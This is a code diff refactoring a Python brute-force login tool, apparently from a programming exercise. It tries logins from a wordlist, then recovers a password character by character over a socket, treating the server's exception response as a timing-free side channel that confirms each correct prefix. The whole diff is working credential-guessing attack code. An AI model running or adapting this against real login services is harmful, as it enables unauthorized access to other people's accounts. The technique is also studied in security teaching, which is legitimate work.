@@ -36,6 +36,21 @@ def get_logins():
     with open(LOGINS) as f:
         logins = (line.strip() for line in f)
         yield from logins
+        raise LookupError(f'{LOGINS=} exhausted without a match!')
+
+
+def get_passwords():
+    password = ''
+    while True:
+        for character in ALPHABET:
+            match = yield password + character
+            if match:
+                password = match
+                yield  # Give None to the send method
+                break
+
+        else:
+            raise LookupError(f'{ALPHABET=} exhausted without a match!')
 
 
 def brute_force_login(client):
@@ -49,29 +64,22 @@ def brute_force_login(client):
         if response == WRONG_PASSWORD:
             return login
 
-    else:
-        raise LookupError(f'{LOGINS=} exhausted without a match!')
-
 
 def brute_force_password(client, login):
-    password = []
-    while True:
-        for character in ALPHABET:
-            candidate = ''.join(password) + character
-            credentials = Credentials(login, candidate)
+    passwords = get_passwords()
+    for password in passwords:
+        credentials = Credentials(login, password)
 
-            client.send(credentials.to_json().encode())
-            response = client.recv(1024).decode()
-            response = loads(response)
+        client.send(credentials.to_json().encode())
+        response = client.recv(1024).decode()
+        response = loads(response)
 
-            if response == EXCEPTION:
-                password.append(character)
-                break
-            elif response == SUCCESS:
-                return candidate
-
-        else:
-            raise LookupError(f'{ALPHABET=} exhausted without a match!')
+        if response == EXCEPTION:
+            # Notify passwords that we got a match
+            passwords.send(password)
+            pass
+        elif response == SUCCESS:
+            return password
 
 
 def main():
